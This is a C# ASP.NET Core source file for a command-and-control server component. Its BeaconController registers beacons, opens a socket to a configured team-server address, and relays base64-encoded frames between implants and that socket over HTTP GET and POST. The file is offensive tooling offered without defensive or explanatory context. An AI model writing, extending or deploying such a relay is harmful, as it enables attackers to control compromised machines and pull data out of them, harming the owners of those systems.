using System;
using System.IO;
using ClientC2;
using ClientC2.channels;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Options;

namespace ServerC2
{
  
    [Route("beacon/{rid?}")]
    public class BeaconController : Controller
    {
        private const string IdHeader = "X-C2-Beacon";
        private readonly ChannelManager<SocketChannel> _manager;
        private readonly SocketSettings _settings;

        public BeaconController(IOptions<SocketSettings> settings, ChannelManager<SocketChannel> manager)
        {
            _settings = settings.Value;
            _manager = manager;
        }

        [HttpOptions]
        public void Options()
        {
            var socket = new SocketChannel(_settings.IpAddress, _settings.Port);
            socket.Connect();
            var beaconId = new BeaconId { InternalId = Guid.NewGuid() };
            _manager.AddChannel(beaconId, socket);

            HttpContext.Response.Headers.Add("X-Id-Header", IdHeader);
            HttpContext.Response.Headers.Add("X-Identifier", beaconId.InternalId.ToString());
        }

        [HttpGet]
        public string Get()
        {
            var beacon = GetBeacon();

            return beacon.socket != null
                ? Convert.ToBase64String(beacon.socket.ReadFrame())
                : string.Empty;
        }

        [HttpPost]
        public void Post()
        {
            var reader = new StreamReader(HttpContext.Request.Body);
            var b64Str = reader.ReadToEnd();
            reader.Dispose();

            var frame = Convert.FromBase64String(b64Str);
            GetBeacon().socket.SendFrame(frame);
        }
        private (Guid id, SocketChannel socket) GetBeacon()
        {
            var headers = HttpContext.Request.Headers;
            var beaconId = headers.ContainsKey(IdHeader)
                ? Guid.Parse(headers[IdHeader])
                : Guid.Empty;

            return (beaconId, _manager.GetChannelById(new BeaconId { InternalId = beaconId }));
        }
    }
}